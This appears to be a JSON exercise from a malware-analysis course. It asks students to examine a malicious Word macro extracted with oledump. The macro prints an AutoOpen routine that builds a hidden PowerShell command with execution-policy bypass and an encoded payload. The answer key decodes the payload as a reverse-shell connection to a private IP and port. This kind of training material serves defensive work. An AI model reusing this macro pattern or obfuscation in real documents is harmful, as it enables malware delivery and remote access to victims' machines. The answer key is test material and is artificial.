@@ -1,0 +1,14 @@
+{
+    "id": "task2",
+    "chapterId": "ch_9",
+    "title": "Extract Macro from Malicious Document",
+    "description": "Use oledump.py to extract and analyze a VBA macro from a maldoc.",
+    "estimatedMinutes": 15,
+    "problemStatement": "### Scenario\nYou run `oledump.py` on a suspicious file `Invoice_URGENT.docm`. The output shows:\n\n```\nA: word/vbaProject.bin\n   A1:       450 'PROJECT'\n   A2:       102 'PROJECTwm'\n   A3: M    1890 'VBA/ThisDocument'\n   A4:      2500 'VBA/_VBA_PROJECT'\n```\n\nYou extract stream A3 and find the following VBA code (excerpt):\n\n```vba\nSub AutoOpen()\n    Dim objShell As Object\n    Set objShell = CreateObject(\"WScript.Shell\")\n    Dim strCmd As String\n    strCmd = \"p\" + \"o\" + \"w\" + \"e\" + \"r\" + \"s\" + \"h\" + \"e\" + \"l\" + \"l\" + \" \" + \"-\" + \"e\" + \"x\" + \" \" + \"B\" + \"y\" + \"p\" + \"a\" + \"s\" + \"s\" + \" \" + \"-\" + \"e\" + \"n\" + \"c\" + \" \" + \"JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADMANAApADsA\"\n    objShell.Run strCmd, 0, False\nEnd Sub\n```\n\n### Questions\n1.  What triggers the macro to execute? (Look at the subroutine name).\n2.  What technique is used to obfuscate the string 'powershell'?\n3.  Decode the Base64 portion (using knowledge from Chapter 4 and 9). What does it do?\n4.  What is the C2 IP address and port?",
+    "hints": [
+        "AutoOpen runs automatically when the document is opened.",
+        "Use CyberChef: From Base64 -> Decode text (UTF-16LE)."
+    ],
+    "expectedOutput": "1. AutoOpen() subroutine triggers on document open.\n2. String concatenation to evade static detection.\n3. Decoded: `$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4434);` (Reverse shell).\n4. IP: 192.168.1.100, Port: 4434.",
+    "solutionCode": "N/A"
+}
